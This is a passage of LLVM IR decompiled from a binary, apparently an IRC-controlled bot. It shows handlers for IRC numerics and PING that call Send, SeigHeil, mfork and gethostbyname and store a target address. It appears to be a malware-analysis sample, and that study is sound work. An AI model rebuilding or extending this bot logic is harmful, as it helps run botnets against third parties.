  %stack_var_-60.0 = phi i32 [ %stack_var_-60.1, %dec_label_pc_805613a ], [ %v4_8056147, %dec_label_pc_8056147 ]
  %v4_805614a = add i32 %storemerge6, 1
  br label %dec_label_pc_805614d

dec_label_pc_805614d:                             ; preds = %dec_label_pc_805614d.preheader, %dec_label_pc_805614a
  %stack_var_-60.1 = phi i32 [ %stack_var_-60.0, %dec_label_pc_805614a ], [ 0, %dec_label_pc_805614d.preheader ]
  %storemerge6 = phi i32 [ %v4_805614a, %dec_label_pc_805614a ], [ 0, %dec_label_pc_805614d.preheader ]
  store i32 %storemerge6, i32* %edx.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_80560ff.lcssa, i32* @edi, align 4
  %v3_8056167 = call i32 @_strlen(i8* %stack_var_-64.0.lcssa)
  %v7_805616e = icmp ult i32 %storemerge6, %v3_8056167
  br i1 %v7_805616e, label %dec_label_pc_805613a, label %dec_label_pc_8056172

dec_label_pc_8056172:                             ; preds = %dec_label_pc_805614d
  %v4_8056172 = add i32 %stack_var_-60.1, 1
  %v7_8056179 = icmp sgt i32 %v4_8056172, 10
  %.v4_8056172 = select i1 %v7_8056179, i32 10, i32 %v4_8056172
  %v0_805618f = load i32, i32* @ebp, align 4
  %tmp = mul i32 %.v4_8056172, 4
  %v3_805618f = add i32 %tmp, -112
  %v4_805618f = add i32 %v3_805618f, %v0_805618f
  %v5_805618f = inttoptr i32 %v4_805618f to i32*
  store i32 ptrtoint (i32* @global_var_8069449.536 to i32), i32* %v5_805618f, align 4
  %v2_805623c115 = load i8, i8* %stack_var_-64.0.lcssa, align 1
  %v4_805623f117 = icmp eq i8 %v2_805623c115, 0
  %v1_8056241119 = icmp eq i1 %v4_805623f117, false
  br i1 %v1_8056241119, label %dec_label_pc_80561a3, label %dec_label_pc_8056247

dec_label_pc_80561a3:                             ; preds = %dec_label_pc_8056172, %dec_label_pc_80561f0
  %v4_8056239121.in = phi i8* [ %v26_8056236.pre-phi, %dec_label_pc_80561f0 ], [ %stack_var_-64.0.lcssa, %dec_label_pc_8056172 ]
  %stack_var_-56.0120 = phi i32 [ %v4_8056230, %dec_label_pc_80561f0 ], [ 1, %dec_label_pc_8056172 ]
  %v4_8056239121 = ptrtoint i8* %v4_8056239121.in to i32
  %v5_80561a3 = add i32 %v4_8056239121, 1
  %v22_80561a3 = inttoptr i32 %v5_80561a3 to i8*
  %v5_80561ac = icmp slt i32 %stack_var_-56.0120, %.v4_8056172
  br i1 %v5_80561ac, label %dec_label_pc_80561be.preheader, label %dec_label_pc_8056247

dec_label_pc_80561be.preheader:                   ; preds = %dec_label_pc_80561a3
  br label %dec_label_pc_80561be

dec_label_pc_80561bb:                             ; preds = %dec_label_pc_80561e3
  %v4_80561bb = add i32 %storemerge5, 1
  br label %dec_label_pc_80561be

dec_label_pc_80561be:                             ; preds = %dec_label_pc_80561be.preheader, %dec_label_pc_80561bb
  %storemerge5 = phi i32 [ %v4_80561bb, %dec_label_pc_80561bb ], [ 0, %dec_label_pc_80561be.preheader ]
  store i32 %storemerge5, i32* %edx.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v5_80561a3, i32* @edi, align 4
  %v3_80561d8 = call i32 @_strlen(i8* %v22_80561a3)
  %v4_80561d8 = mul i32 %v3_80561d8, -1
  %v5_80561d8 = add i32 %v4_80561d8, -2
  store i32 %v5_80561d8, i32* @ecx, align 4
  %v1_80561de = sub i32 0, %v4_80561d8
  %v0_80561df = load i32, i32* %edx.global-to-local, align 4
  %v7_80561df = icmp ult i32 %v0_80561df, %v1_80561de
  %v1_80561e1 = icmp eq i1 %v7_80561df, false
  %.pre46 = add i32 %storemerge5, %v5_80561a3
  br i1 %v1_80561e1, label %dec_label_pc_80561be.dec_label_pc_80561f0_crit_edge, label %dec_label_pc_80561e3

dec_label_pc_80561be.dec_label_pc_80561f0_crit_edge: ; preds = %dec_label_pc_80561be
  %.pre53 = inttoptr i32 %.pre46 to i8*
  br label %dec_label_pc_80561f0

dec_label_pc_80561e3:                             ; preds = %dec_label_pc_80561be
  %v1_80561e9 = inttoptr i32 %.pre46 to i8*
  %v2_80561e9 = load i8, i8* %v1_80561e9, align 1
  %v7_80561ec = icmp eq i8 %v2_80561e9, 32
  %v1_80561ee = icmp eq i1 %v7_80561ec, false
  br i1 %v1_80561ee, label %dec_label_pc_80561bb, label %dec_label_pc_80561f0

dec_label_pc_80561f0:                             ; preds = %dec_label_pc_80561e3, %dec_label_pc_80561be.dec_label_pc_80561f0_crit_edge
  %v26_8056236.pre-phi = phi i8* [ %.pre53, %dec_label_pc_80561be.dec_label_pc_80561f0_crit_edge ], [ %v1_80561e9, %dec_label_pc_80561e3 ]
  store i32 %stack_var_-56.0120, i32* @ebx, align 4
  %v1_80561f6 = add i32 %storemerge5, 1
  %v1_80561fa = call i32 @malloc(i32 %v1_80561f6)
  %v1_80561ff = load i32, i32* @ebp, align 4
  %v2_80561ff = load i32, i32* @ebx, align 4
  %v3_80561ff = mul i32 %v2_80561ff, 4
  %v4_80561ff = add i32 %v1_80561ff, -116
  %v5_80561ff = add i32 %v4_80561ff, %v3_80561ff
  %v6_80561ff = inttoptr i32 %v5_80561ff to i32*
  store i32 %v1_80561fa, i32* %v6_80561ff, align 4
  store i32 %storemerge5, i32* %edx.global-to-local, align 4
  %v0_8056209 = load i32, i32* @ebp, align 4
  %v2_8056209 = mul nuw nsw i32 %stack_var_-56.0120, 4
  %v3_8056209 = add nuw nsw i32 %v2_8056209, -116
  %v4_8056209 = add i32 %v0_8056209, %v3_8056209
  %v5_8056209 = inttoptr i32 %v4_8056209 to i32*
  %v6_8056209 = load i32, i32* %v5_8056209, align 4
  %v4_805621b = inttoptr i32 %v6_8056209 to i8*
  %v5_805621b = call i32 @strncpy(i8* %v4_805621b, i32 %v5_80561a3, i32 %storemerge5)
  %v0_8056223 = load i32, i32* @ebp, align 4
  %v4_8056223 = add i32 %v0_8056223, %v3_8056209
  %v5_8056223 = inttoptr i32 %v4_8056223 to i32*
  %v6_8056223 = load i32, i32* %v5_8056223, align 4
  store i32 %v6_8056223, i32* %edx.global-to-local, align 4
  %v2_805622a = add i32 %v6_8056223, %storemerge5
  %v1_805622d = inttoptr i32 %v2_805622a to i8*
  store i8 0, i8* %v1_805622d, align 1
  %v4_8056230 = add nuw nsw i32 %stack_var_-56.0120, 1
  %v2_805623c = load i8, i8* %v26_8056236.pre-phi, align 1
  %v4_805623f = icmp eq i8 %v2_805623c, 0
  %v1_8056241 = icmp eq i1 %v4_805623f, false
  br i1 %v1_8056241, label %dec_label_pc_80561a3, label %dec_label_pc_8056247

dec_label_pc_8056247:                             ; preds = %dec_label_pc_80561f0, %dec_label_pc_80561a3, %dec_label_pc_8056172
  %v4_80562c3 = load i32, i32* bitcast ([4 x i8]** @global_var_8070da0.538 to i32*), align 8
  %v1_80562ca = icmp eq i32 %v4_80562c3, 0
  %v1_80562cc = icmp eq i1 %v1_80562ca, false
  br i1 %v1_80562cc, label %dec_label_pc_8056250, label %dec_label_pc_80562ce

dec_label_pc_8056250:                             ; preds = %dec_label_pc_8056247
  store i32 %v4_80562c3, i32* %edx.global-to-local, align 4
  %v3_8056267 = inttoptr i32 %v4_80562c3 to i8*
  %v4_8056267 = call i32 @__GI_strcasecmp(i8* %v3_8056267, i32 %v2_805549c)
  %v4_8056273 = load i32, i32* @global_var_8070da4.539, align 4
  store i32 %v4_8056273, i32* @ecx, align 4
  %v1_805627d = add i32 %.v4_8056172, -1
  store i32 %v1_805627d, i32* %edx.global-to-local, align 4
  call void @__pseudo_call(i32 %v4_8056273)
  %v5_80562b9112 = icmp sgt i32 %.v4_8056172, 1
  br i1 %v5_80562b9112, label %dec_label_pc_80562a1, label %dec_label_pc_80562ce

dec_label_pc_80562a1:                             ; preds = %dec_label_pc_8056250, %dec_label_pc_80562a1
  %storemerge113 = phi i32 [ %v4_80562b0, %dec_label_pc_80562a1 ], [ 1, %dec_label_pc_8056250 ]
  %v0_80562a4 = load i32, i32* @ebp, align 4
  %v2_80562a4 = mul nuw nsw i32 %storemerge113, 4
  %v3_80562a4 = add nuw nsw i32 %v2_80562a4, -116
  %v4_80562a4 = add i32 %v3_80562a4, %v0_80562a4
  %v5_80562a4 = inttoptr i32 %v4_80562a4 to i32*
  %v6_80562a4 = load i32, i32* %v5_80562a4, align 4
  %v1_80562ab = call i32 @free(i32 %v6_80562a4)
  %v4_80562b0 = add nuw nsw i32 %storemerge113, 1
  %v5_80562b9 = icmp slt i32 %v4_80562b0, %.v4_8056172
  br i1 %v5_80562b9, label %dec_label_pc_80562a1, label %dec_label_pc_80562ce

dec_label_pc_80562ce:                             ; preds = %dec_label_pc_8056250, %dec_label_pc_80562a1, %dec_label_pc_8056247, %dec_label_pc_8055fd8, %dec_label_pc_8055eb8, %dec_label_pc_8055d98, %dec_label_pc_8055c78, %dec_label_pc_8055b58, %dec_label_pc_8055a38, %dec_label_pc_8055918, %dec_label_pc_80557f8, %dec_label_pc_80556d8, %dec_label_pc_80555b8, %dec_label_pc_8055503, %dec_label_pc_8055480, %dec_label_pc_8055469, %entry
  %v0_80562d7 = phi i32 [ %v4_80562c3, %dec_label_pc_8056247 ], [ %v1_8055fde, %dec_label_pc_8055fd8 ], [ %v1_8055ebe, %dec_label_pc_8055eb8 ], [ %v1_8055d9e, %dec_label_pc_8055d98 ], [ %v1_8055c7e, %dec_label_pc_8055c78 ], [ %v1_8055b5e, %dec_label_pc_8055b58 ], [ %v1_8055a3e, %dec_label_pc_8055a38 ], [ %v1_805591e, %dec_label_pc_8055918 ], [ %v1_80557fe, %dec_label_pc_80557f8 ], [ %v1_80556de, %dec_label_pc_80556d8 ], [ %v1_80555be, %dec_label_pc_80555b8 ], [ %v4_805551b, %dec_label_pc_8055503 ], [ %v4_805548f, %dec_label_pc_8055480 ], [ %v3_8055475, %dec_label_pc_8055469 ], [ 0, %entry ], [ 1, %dec_label_pc_8056250 ], [ %.v4_8056172, %dec_label_pc_80562a1 ]
  ret i32 %v0_80562d7

; uselistorder directives
  uselistorder i32 %v4_80562b0, { 1, 0 }
  uselistorder i32 %storemerge113, { 1, 0 }
  uselistorder i32 %v4_80562c3, { 0, 2, 1, 3 }
  uselistorder i8* %v26_8056236.pre-phi, { 1, 0 }
  uselistorder i32 %.pre46, { 1, 0 }
  uselistorder i32 %storemerge5, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_80561a3, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-56.0120, { 3, 2, 1, 0 }
  uselistorder i32 %.v4_8056172, { 1, 5, 2, 4, 3, 0 }
  uselistorder i32 %storemerge6, { 0, 3, 1, 2 }
  uselistorder i32 %v4_8056126, { 1, 0 }
  uselistorder i32 %v5_8056123, { 0, 2, 1 }
  uselistorder i8* %stack_var_-64.0129, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v4_80560ff131, { 0, 1, 3, 2 }
  uselistorder i16* %v1_80560b5, { 1, 0 }
  uselistorder i16* %v1_8055f95, { 1, 0 }
  uselistorder i16* %v1_8055e75, { 1, 0 }
  uselistorder i16* %v1_8055d55, { 1, 0 }
  uselistorder i16* %v1_8055c35, { 1, 0 }
  uselistorder i16* %v1_8055b15, { 1, 0 }
  uselistorder i16* %v1_80559f5, { 1, 0 }
  uselistorder i16* %v1_80558d5, { 1, 0 }
  uselistorder i16* %v1_80557b5, { 1, 0 }
  uselistorder i16* %v1_8055695, { 1, 0 }
  uselistorder i32 %.pre37, { 0, 2, 1 }
  uselistorder i32 %storemerge8, { 1, 0, 3, 2 }
  uselistorder i32 %.pre29, { 1, 0 }
  uselistorder i32 %storemerge9, { 1, 0, 3, 2 }
  uselistorder i32 %.pre, { 1, 0, 3, 2 }
  uselistorder i32 %storemerge10, { 1, 0, 3, 2 }
  uselistorder i32 %v4_80553bf, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 11, 12 }
  uselistorder i32* %stack_var_-2168, { 0, 10, 1, 11, 2, 12, 3, 13, 4, 14, 5, 15, 6, 16, 7, 17, 8, 18, 9, 19 }
  uselistorder i32 (i32)* @pclose, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([15 x i8]* @global_var_806c985.517 to i32), { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i16*)* @feof, { 10, 9, 11, 8, 12, 7, 13, 6, 14, 5, 15, 4, 16, 3, 17, 2, 18, 1, 19, 0 }
  uselistorder [2 x i8]* @global_var_8069c83.83, { 1, 0 }
  uselistorder i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_8069c83.83, i32 0, i32 0), { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @mfork, { 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 2, 1, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 0 }
  uselistorder i8* @global_var_80756c8.28, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80562ce, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder label %dec_label_pc_80562a1, { 1, 0 }
  uselistorder label %dec_label_pc_80561be, { 1, 0 }
  uselistorder label %dec_label_pc_80561a3, { 1, 0 }
  uselistorder label %dec_label_pc_805614d, { 1, 0 }
  uselistorder label %dec_label_pc_805614a, { 1, 0 }
  uselistorder label %dec_label_pc_805614d.preheader, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_80560ff, { 1, 0 }
  uselistorder label %dec_label_pc_80560d5, { 1, 0 }
  uselistorder label %dec_label_pc_8056044, { 1, 0 }
  uselistorder label %dec_label_pc_8055fb5, { 1, 0 }
  uselistorder label %dec_label_pc_8055f24, { 1, 0 }
  uselistorder label %dec_label_pc_8055e95, { 1, 0 }
  uselistorder label %dec_label_pc_8055e04, { 1, 0 }
  uselistorder label %dec_label_pc_8055d75, { 1, 0 }
  uselistorder label %dec_label_pc_8055ce4, { 1, 0 }
  uselistorder label %dec_label_pc_8055c55, { 1, 0 }
  uselistorder label %dec_label_pc_8055bc4, { 1, 0 }
  uselistorder label %dec_label_pc_8055b35, { 1, 0 }
  uselistorder label %dec_label_pc_8055aa4, { 1, 0 }
  uselistorder label %dec_label_pc_8055a15, { 1, 0 }
  uselistorder label %dec_label_pc_8055984, { 1, 0 }
  uselistorder label %dec_label_pc_80558f5, { 1, 0 }
  uselistorder label %dec_label_pc_8055864, { 1, 0 }
  uselistorder label %dec_label_pc_80557d5, { 1, 0 }
  uselistorder label %dec_label_pc_8055744, { 1, 0 }
  uselistorder label %dec_label_pc_80556b5, { 1, 0 }
  uselistorder label %dec_label_pc_8055624, { 1, 0 }
  uselistorder label %dec_label_pc_8055595, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80554d1, { 1, 0 }
  uselistorder label %dec_label_pc_8055437, { 1, 0 }
  uselistorder label %dec_label_pc_80553de, { 1, 0 }
}

define i32 @_376(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_80562d8 = load i32, i32* @ebp, align 4
  store i32 %v0_80562d8, i32* %stack_var_-4, align 4
  %v4_80562d8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80562d8, i32* @ebp, align 4
  %v3_80562f5 = call i32 @Send(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_806d47a.540 to i32))
  %v3_805631b = call i32 @Send(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_806d487.542 to i32))
  %v3_8056337 = call i32 @Send(i32 %arg1, i32 ptrtoint ([8 x i8]* @global_var_806d494.543 to i32))
  %v0_805633c = load i32, i32* @global_var_80756c0.301, align 64
  %v1_8056341 = icmp eq i32 %v0_805633c, 0
  %v1_8056343 = icmp eq i1 %v1_8056341, false
  br i1 %v1_8056343, label %dec_label_pc_8056350, label %dec_label_pc_8056345

dec_label_pc_8056345:                             ; preds = %entry
  %v1_805634b = call i32 @SeigHeil(i32 %arg1)
  br label %dec_label_pc_8056350

dec_label_pc_8056350:                             ; preds = %entry, %dec_label_pc_8056345
  %v0_8056351 = phi i32 [ %v0_805633c, %entry ], [ %v1_805634b, %dec_label_pc_8056345 ]
  ret i32 %v0_8056351

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32)* @SeigHeil, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8056350, { 1, 0 }
}

define i32 @_PING(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8056352 = load i32, i32* @ebp, align 4
  store i32 %v0_8056352, i32* %stack_var_-4, align 4
  %v4_8056352 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8056352, i32* @ebp, align 4
  %v3_805636d = call i32 @Send(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_806d49c.544 to i32))
  ret i32 %v3_805636d

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @_352(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i8, align 1
  br label %dec_label_pc_8056398.preheader

dec_label_pc_8056392:                             ; preds = %dec_label_pc_80563b7
  %v5_8056392 = add i32 %.pre36, 1
  %v22_8056392 = inttoptr i32 %v5_8056392 to i8*
  %v4_8056395 = add i32 %stack_var_-28.0, 1
  br label %dec_label_pc_8056398

dec_label_pc_8056398:                             ; preds = %dec_label_pc_8056398.preheader, %dec_label_pc_8056392
  %stack_var_-28.0 = phi i32 [ %v4_8056395, %dec_label_pc_8056392 ], [ %stack_var_-28.172, %dec_label_pc_8056398.preheader ]
  %stack_var_-20.0 = phi i8* [ %v22_8056392, %dec_label_pc_8056392 ], [ %stack_var_-20.173, %dec_label_pc_8056398.preheader ]
  %v3_80563ac = call i32 @_strlen(i8* %arg2)
  %v7_80563b3 = icmp ult i32 %stack_var_-28.0, %v3_80563ac
  %v1_80563b5 = icmp eq i1 %v7_80563b3, false
  %.pre36 = ptrtoint i8* %stack_var_-20.0 to i32
  br i1 %v1_80563b5, label %dec_label_pc_80563c1, label %dec_label_pc_80563b7

dec_label_pc_80563b7:                             ; preds = %dec_label_pc_8056398
  %v2_80563ba = load i8, i8* %stack_var_-20.0, align 1
  %v7_80563bd = icmp eq i8 %v2_80563ba, 32
  %v1_80563bf = icmp eq i1 %v7_80563bd, false
  br i1 %v1_80563bf, label %dec_label_pc_8056392, label %dec_label_pc_80563c1

dec_label_pc_80563c1:                             ; preds = %dec_label_pc_8056398, %dec_label_pc_80563b7
  %v5_80563c1 = add i32 %.pre36, 1
  %v3_80563d8 = call i32 @_strlen(i8* %arg2)
  %v4_80563d8 = mul i32 %v3_80563d8, -1
  %v1_80563de = sub i32 0, %v4_80563d8
  %v2_80563df = sub i32 0, %v4_80563d8
  %v12_80563df = icmp eq i32 %stack_var_-28.0, %v2_80563df
  br i1 %v12_80563df, label %dec_label_pc_80565b7, label %dec_label_pc_80563e7

dec_label_pc_80563e7:                             ; preds = %dec_label_pc_80563c1
  %v22_80563c1 = inttoptr i32 %v5_80563c1 to i8*
  %v4_80563e7 = add nuw nsw i32 %storemerge1174, 1
  %v7_80563ee = icmp sgt i32 %storemerge1174, 3
  br i1 %v7_80563ee, label %dec_label_pc_80563fc.preheader, label %dec_label_pc_8056398.preheader

dec_label_pc_8056398.preheader:                   ; preds = %entry, %dec_label_pc_80563e7
  %storemerge1174 = phi i32 [ 0, %entry ], [ %v4_80563e7, %dec_label_pc_80563e7 ]
  %stack_var_-20.173 = phi i8* [ %arg2, %entry ], [ %v22_80563c1, %dec_label_pc_80563e7 ]
  %stack_var_-28.172 = phi i32 [ 0, %entry ], [ %stack_var_-28.0, %dec_label_pc_80563e7 ]
  br label %dec_label_pc_8056398

dec_label_pc_80563fc.preheader:                   ; preds = %dec_label_pc_80563e7
  br label %dec_label_pc_80563fc

dec_label_pc_80563f9:                             ; preds = %dec_label_pc_805641b
  %v4_80563f9 = add i32 %storemerge10, 1
  br label %dec_label_pc_80563fc

dec_label_pc_80563fc:                             ; preds = %dec_label_pc_80563fc.preheader, %dec_label_pc_80563f9
  %storemerge10 = phi i32 [ %v4_80563f9, %dec_label_pc_80563f9 ], [ 0, %dec_label_pc_80563fc.preheader ]
  %v3_8056410 = call i32 @_strlen(i8* %v22_80563c1)
  %v7_8056417 = icmp ult i32 %storemerge10, %v3_8056410
  %v1_8056419 = icmp eq i1 %v7_8056417, false
  %.pre = add i32 %storemerge10, %v5_80563c1
  br i1 %v1_8056419, label %dec_label_pc_80563fc.dec_label_pc_8056428_crit_edge, label %dec_label_pc_805641b

dec_label_pc_80563fc.dec_label_pc_8056428_crit_edge: ; preds = %dec_label_pc_80563fc
  %.pre25 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_8056428

dec_label_pc_805641b:                             ; preds = %dec_label_pc_80563fc
  %v1_8056421 = inttoptr i32 %.pre to i8*
  %v2_8056421 = load i8, i8* %v1_8056421, align 1
  %v7_8056424 = icmp eq i8 %v2_8056421, 32
  %v1_8056426 = icmp eq i1 %v7_8056424, false
  br i1 %v1_8056426, label %dec_label_pc_80563f9, label %dec_label_pc_8056428

dec_label_pc_8056428:                             ; preds = %dec_label_pc_805641b, %dec_label_pc_80563fc.dec_label_pc_8056428_crit_edge
  %v1_805642e.pre-phi = phi i8* [ %.pre25, %dec_label_pc_80563fc.dec_label_pc_8056428_crit_edge ], [ %v1_8056421, %dec_label_pc_805641b ]
  store i8 0, i8* %v1_805642e.pre-phi, align 1
  %v0_8056431 = load i32, i32* @global_var_807e1ac.53, align 4
  %v3_8056440 = call i32 @__GI_strcasecmp(i8* %v22_80563c1, i32 %v0_8056431)
  %v1_8056445 = icmp eq i32 %v3_8056440, 0
  %v1_8056447 = icmp eq i1 %v1_8056445, false
  br i1 %v1_8056447, label %dec_label_pc_80565b7, label %dec_label_pc_805644d

dec_label_pc_805644d:                             ; preds = %dec_label_pc_8056428
  %v0_805644d = load i64, i64* @global_var_80756d0.34, align 8
  %v1_805644d = trunc i64 %v0_805644d to i32
  %v1_8056452 = icmp eq i32 %v1_805644d, 0
  %v1_8056454 = icmp eq i1 %v1_8056452, false
  br i1 %v1_8056454, label %dec_label_pc_80565b7, label %dec_label_pc_805645a

dec_label_pc_805645a:                             ; preds = %dec_label_pc_805644d
  br label %dec_label_pc_8056476.preheader

dec_label_pc_8056470:                             ; preds = %dec_label_pc_8056495
  %v5_8056470 = add i32 %.pre35, 1
  %v22_8056470 = inttoptr i32 %v5_8056470 to i8*
  %v4_8056473 = add i32 %stack_var_-28.2, 1
  br label %dec_label_pc_8056476

dec_label_pc_8056476:                             ; preds = %dec_label_pc_8056476.preheader, %dec_label_pc_8056470
  %stack_var_-28.2 = phi i32 [ %v4_8056473, %dec_label_pc_8056470 ], [ %stack_var_-28.369, %dec_label_pc_8056476.preheader ]
  %stack_var_-20.2 = phi i8* [ %v22_8056470, %dec_label_pc_8056470 ], [ %stack_var_-20.370, %dec_label_pc_8056476.preheader ]
  %v3_805648a = call i32 @_strlen(i8* %arg2)
  %v7_8056491 = icmp ult i32 %stack_var_-28.2, %v3_805648a
  %v1_8056493 = icmp eq i1 %v7_8056491, false
  %.pre35 = ptrtoint i8* %stack_var_-20.2 to i32
  br i1 %v1_8056493, label %dec_label_pc_805649f, label %dec_label_pc_8056495

dec_label_pc_8056495:                             ; preds = %dec_label_pc_8056476
  %v2_8056498 = load i8, i8* %stack_var_-20.2, align 1
  %v7_805649b = icmp eq i8 %v2_8056498, 32
  %v1_805649d = icmp eq i1 %v7_805649b, false
  br i1 %v1_805649d, label %dec_label_pc_8056470, label %dec_label_pc_805649f

dec_label_pc_805649f:                             ; preds = %dec_label_pc_8056476, %dec_label_pc_8056495
  %v5_805649f = add i32 %.pre35, 1
  %v3_80564b6 = call i32 @_strlen(i8* %arg2)
  %v4_80564b6 = mul i32 %v3_80564b6, -1
  %v1_80564bc = sub i32 0, %v4_80564b6
  %v2_80564bd = sub i32 0, %v4_80564b6
  %v12_80564bd = icmp eq i32 %stack_var_-28.2, %v2_80564bd
  br i1 %v12_80564bd, label %dec_label_pc_80565b7, label %dec_label_pc_80564c5

dec_label_pc_80564c5:                             ; preds = %dec_label_pc_805649f
  %v22_805649f = inttoptr i32 %v5_805649f to i8*
  %v4_80564c5 = add nuw nsw i32 %storemerge971, 1
  %v7_80564cc = icmp sgt i32 %storemerge971, 1
  br i1 %v7_80564cc, label %dec_label_pc_80564da.preheader, label %dec_label_pc_8056476.preheader

dec_label_pc_8056476.preheader:                   ; preds = %dec_label_pc_805645a, %dec_label_pc_80564c5
  %storemerge971 = phi i32 [ 0, %dec_label_pc_805645a ], [ %v4_80564c5, %dec_label_pc_80564c5 ]
  %stack_var_-20.370 = phi i8* [ %arg2, %dec_label_pc_805645a ], [ %v22_805649f, %dec_label_pc_80564c5 ]
  %stack_var_-28.369 = phi i32 [ 0, %dec_label_pc_805645a ], [ %stack_var_-28.2, %dec_label_pc_80564c5 ]
  br label %dec_label_pc_8056476

dec_label_pc_80564da.preheader:                   ; preds = %dec_label_pc_80564c5
  br label %dec_label_pc_80564da

dec_label_pc_80564d7:                             ; preds = %dec_label_pc_80564f9
  %v4_80564d7 = add i32 %storemerge, 1
  br label %dec_label_pc_80564da

dec_label_pc_80564da:                             ; preds = %dec_label_pc_80564da.preheader, %dec_label_pc_80564d7
  %storemerge = phi i32 [ %v4_80564d7, %dec_label_pc_80564d7 ], [ 0, %dec_label_pc_80564da.preheader ]
  store i32 %storemerge, i32* @edx, align 4
  store i1 false, i1* @df, align 1
  store i32 %v5_805649f, i32* @edi, align 4
  %v3_80564ee = call i32 @_strlen(i8* %v22_805649f)
  %v0_80564f5 = load i32, i32* @edx, align 4
  %v7_80564f5 = icmp ult i32 %v0_80564f5, %v3_80564ee
  %v1_80564f7 = icmp eq i1 %v7_80564f5, false
  %.pre26 = add i32 %storemerge, %v5_805649f
  br i1 %v1_80564f7, label %dec_label_pc_80564da.dec_label_pc_8056506_crit_edge, label %dec_label_pc_80564f9

dec_label_pc_80564da.dec_label_pc_8056506_crit_edge: ; preds = %dec_label_pc_80564da
  %.pre33 = inttoptr i32 %.pre26 to i8*
  br label %dec_label_pc_8056506

dec_label_pc_80564f9:                             ; preds = %dec_label_pc_80564da
  %v1_80564ff = inttoptr i32 %.pre26 to i8*
  %v2_80564ff = load i8, i8* %v1_80564ff, align 1
  %v7_8056502 = icmp eq i8 %v2_80564ff, 32
  %v1_8056504 = icmp eq i1 %v7_8056502, false
  br i1 %v1_8056504, label %dec_label_pc_80564d7, label %dec_label_pc_8056506

dec_label_pc_8056506:                             ; preds = %dec_label_pc_80564f9, %dec_label_pc_80564da.dec_label_pc_8056506_crit_edge
  %v1_805650c.pre-phi = phi i8* [ %.pre33, %dec_label_pc_80564da.dec_label_pc_8056506_crit_edge ], [ %v1_80564ff, %dec_label_pc_80564f9 ]
  store i8 0, i8* %v1_805650c.pre-phi, align 1
  %v1_8056515 = call i32 @inet_addr(i32 %v5_805649f)
  %v2_8056515 = trunc i32 %v1_8056515 to i8
  store i8 %v2_8056515, i8* %stack_var_-32, align 1
  %sext = mul i32 %v1_8056515, 16777216
  %tmp = icmp eq i32 %sext, -16777216
  %v1_8056523 = icmp eq i1 %tmp, false
  br i1 %v1_8056523, label %dec_label_pc_8056506._crit_edge, label %dec_label_pc_8056525

dec_label_pc_8056506._crit_edge:                  ; preds = %dec_label_pc_8056506
  br label %bb

dec_label_pc_8056525:                             ; preds = %dec_label_pc_8056506
  %v1_805652b = call i32 @__GI_gethostbyname(i32 %v5_805649f)
  %v4_8056533 = icmp eq i32 %v1_805652b, 0
  %v1_8056537 = icmp eq i1 %v4_8056533, false
  br i1 %v1_8056537, label %dec_label_pc_8056557, label %dec_label_pc_8056539

dec_label_pc_8056539:                             ; preds = %dec_label_pc_8056525
  %v2_8056550 = call i32 @Send(i32 %arg1, i32 ptrtoint ([93 x i8]* @global_var_806d4a8.545 to i32))
  br label %dec_label_pc_80565b7

dec_label_pc_8056557:                             ; preds = %dec_label_pc_8056525
  %v1_805655a = add i32 %v1_805652b, 12
  %v2_805655a = inttoptr i32 %v1_805655a to i32*
  %v3_805655a = load i32, i32* %v2_805655a, align 4
  %v1_8056562 = add i32 %v1_805652b, 16
  %v2_8056562 = inttoptr i32 %v1_8056562 to i32*
  %v3_8056562 = load i32, i32* %v2_8056562, align 4
  %v1_8056565 = inttoptr i32 %v3_8056562 to i32*
  %v2_8056565 = load i32, i32* %v1_8056565, align 4
  %v1_805656c = inttoptr i32 %v2_8056565 to i8*
  %v7_805656f = call i8* @_memcpy(i8* nonnull %stack_var_-32, i8* %v1_805656c, i32 %v3_805655a)
  %v2_805657c.pre = load i8, i8* %stack_var_-32, align 1
  br label %bb

bb:                                               ; preds = %dec_label_pc_8056506._crit_edge, %dec_label_pc_8056557
  %v2_805657c = phi i8 [ %v2_8056515, %dec_label_pc_8056506._crit_edge ], [ %v2_805657c.pre, %dec_label_pc_8056557 ]
  store i8 %v2_805657c, i8* bitcast (i8** @global_var_80756cf.546 to i8*), align 4
  store i8 0, i8* bitcast (i8** @global_var_80756cc.33 to i8*), align 4
  store i64 256, i64* @global_var_80756d0.34, align 16
  br label %dec_label_pc_80565b7

